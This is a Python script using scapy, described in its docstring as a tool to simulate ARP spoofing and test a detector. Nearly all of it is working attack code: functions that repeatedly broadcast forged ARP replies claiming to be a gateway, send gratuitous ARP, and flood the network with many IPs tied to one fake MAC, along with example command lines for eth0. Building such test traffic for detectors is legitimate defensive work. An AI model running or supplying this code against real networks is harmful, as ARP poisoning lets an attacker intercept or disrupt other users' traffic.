#!/usr/bin/env python3
"""
ARP Spoofing Test Script
Simulates ARP spoofing attacks to test the detector.
"""

import time
import sys
from scapy.all import *

def arp_spoof_test(target_ip, spoof_ip, interface, duration=30):
    """
    Simulate ARP spoofing attack.
    
    Args:
        target_ip: IP address to spoof (victim)
        spoof_ip: IP address to claim (gateway/router)
        interface: Network interface to use
        duration: Duration of attack in seconds
    """
    print(f"Starting ARP spoofing test...")
    print(f"Target: {target_ip}")
    print(f"Spoofing as: {spoof_ip}")
    print(f"Interface: {interface}")
    print(f"Duration: {duration} seconds")
    print("Press Ctrl+C to stop early\n")
    
    try:
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            # Create spoofed ARP packet with Ethernet header
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,  # ARP reply
                psrc=spoof_ip,  # Claiming to be the gateway
                pdst=target_ip,  # Target victim
                hwsrc="00:11:22:33:44:55"  # Fake MAC address
            )
            
            # Send the packet
            sendp(arp_packet, iface=interface, verbose=False)
            packet_count += 1
            
            # Send every 2 seconds
            time.sleep(2)
            
            if packet_count % 5 == 0:
                print(f"Sent {packet_count} spoofed packets...")
                
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing test...")
    
    print(f"Test completed. Sent {packet_count} spoofed ARP packets.")

def gratuitous_arp_test(spoof_ip, interface, duration=30):
    """
    Test gratuitous ARP (ARP request to self).
    
    Args:
        spoof_ip: IP address to claim
        interface: Network interface to use
        duration: Duration of attack in seconds
    """
    print(f"Starting gratuitous ARP test...")
    print(f"Claiming IP: {spoof_ip}")
    print(f"Interface: {interface}")
    print(f"Duration: {duration} seconds")
    print("Press Ctrl+C to stop early\n")
    
    try:
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            # Create gratuitous ARP packet with Ethernet header
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1,  # ARP request
                psrc=spoof_ip,  # Source IP
                pdst=spoof_ip,  # Destination IP (same as source)
                hwsrc="00:11:22:33:44:55"  # Fake MAC address
            )
            
            # Send the packet
            sendp(arp_packet, iface=interface, verbose=False)
            packet_count += 1
            
            # Send every 3 seconds
            time.sleep(3)
            
            if packet_count % 3 == 0:
                print(f"Sent {packet_count} gratuitous ARP packets...")
                
    except KeyboardInterrupt:
        print("\nStopping gratuitous ARP test...")
    
    print(f"Test completed. Sent {packet_count} gratuitous ARP packets.")

def mac_flood_test(interface, duration=30):
    """
    Test MAC address flooding (multiple IPs from same MAC).
    
    Args:
        interface: Network interface to use
        duration: Duration of attack in seconds
    """
    print(f"Starting MAC flooding test...")
    print(f"Interface: {interface}")
    print(f"Duration: {duration} seconds")
    print("Press Ctrl+C to stop early\n")
    
    fake_mac = "00:11:22:33:44:55"
    fake_ips = ["192.168.1.100", "192.168.1.101", "192.168.1.102", 
                "192.168.1.103", "192.168.1.104"]
    
    try:
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            for fake_ip in fake_ips:
                # Create ARP packet with same MAC, different IPs
                arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,  # ARP reply
                    psrc=fake_ip,
                    pdst="192.168.1.1",  # Gateway
                    hwsrc=fake_mac
                )
                
                # Send the packet
                sendp(arp_packet, iface=interface, verbose=False)
                packet_count += 1
            
            # Send every 5 seconds
            time.sleep(5)
            print(f"Sent {packet_count} MAC flooding packets...")
                
    except KeyboardInterrupt:
        print("\nStopping MAC flooding test...")
    
    print(f"Test completed. Sent {packet_count} MAC flooding packets.")

def simple_arp_spoof_test(interface, duration=30):
    """
    Simple ARP spoofing test that should definitely trigger detection.
    """
    print(f"Starting simple ARP spoofing test...")
    print(f"Interface: {interface}")
    print(f"Duration: {duration} seconds")
    print("Press Ctrl+C to stop early\n")
    
    try:
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            # Create a simple spoofed ARP reply
            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,  # ARP reply
                psrc="192.168.1.1",  # Claiming to be gateway
                pdst="192.168.1.100",  # Target
                hwsrc="00:11:22:33:44:55",  # Fake MAC
                hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast
            )
            
            # Send the packet
            sendp(arp_packet, iface=interface, verbose=False)
            packet_count += 1
            
            # Send every 1 second
            time.sleep(1)
            
            if packet_count % 10 == 0:
                print(f"Sent {packet_count} spoofed packets...")
                
    except KeyboardInterrupt:
        print("\nStopping simple ARP spoofing test...")
    
    print(f"Test completed. Sent {packet_count} spoofed ARP packets.")

def main():
    """Main function for ARP spoofing tests."""
    if len(sys.argv) < 3:
        print("Usage:")
        print("  python test_arp_spoof.py <interface> <test_type> [options]")
        print("\nTest types:")
        print("  1. arp_spoof <target_ip> <spoof_ip>")
        print("  2. gratuitous <spoof_ip>")
        print("  3. mac_flood")
        print("  4. simple")
        print("\nExamples:")
        print("  python test_arp_spoof.py eth0 arp_spoof 192.168.1.100 192.168.1.1")
        print("  python test_arp_spoof.py eth0 gratuitous 192.168.1.50")
        print("  python test_arp_spoof.py eth0 mac_flood")
        print("  python test_arp_spoof.py eth0 simple")
        return
    
    interface = sys.argv[1]
    test_type = sys.argv[2]
    
    if test_type == "arp_spoof":
        if len(sys.argv) < 5:
            print("Error: arp_spoof requires target_ip and spoof_ip")
            return
        target_ip = sys.argv[3]
        spoof_ip = sys.argv[4]
        arp_spoof_test(target_ip, spoof_ip, interface)
        
    elif test_type == "gratuitous":
        if len(sys.argv) < 4:
            print("Error: gratuitous requires spoof_ip")
            return
        spoof_ip = sys.argv[3]
        gratuitous_arp_test(spoof_ip, interface)
        
    elif test_type == "mac_flood":
        mac_flood_test(interface)
        
    elif test_type == "simple":
        simple_arp_spoof_test(interface)
        
    else:
        print(f"Unknown test type: {test_type}")

if __name__ == "__main__":
    main() 